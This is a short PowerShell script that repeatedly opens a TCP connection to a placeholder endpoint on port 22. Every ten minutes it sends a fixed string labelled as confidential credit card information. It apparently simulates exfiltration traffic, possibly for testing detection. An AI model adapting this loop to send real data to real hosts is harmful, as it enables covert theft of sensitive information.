
$dest = "10.0.8.10"; # PLACE VALUE OF ENDPOINT HERE
$message = "Very confidential credit card information";
$bytes = [text.encoding]::ASCII.GetBytes($message); # Text must be converted into bytes to send data over network stream
$sleepTimer = 600 # Set How long the script will sleep for

while($true) {
    try {
        $socket = New-Object System.Net.Sockets.TCPClient;
        $socket.Connect($dest, 22);
        $socketStream = $socket.GetStream()
        $socketStream.Write($bytes,0,$bytes.length) #First param contains buffer of bytes, 2nd param contains location within buffer where stream writes data. 3rd param is length of data t

        Write-Output($socket);

        $socket.Close();
        $socket.Dispose();

    }
    catch {
        Write-Output($_); # This is the variable that displays the error
        $socket.Close();
        $socket.Dispose();
    }

    Start-Sleep -s $sleepTimer
}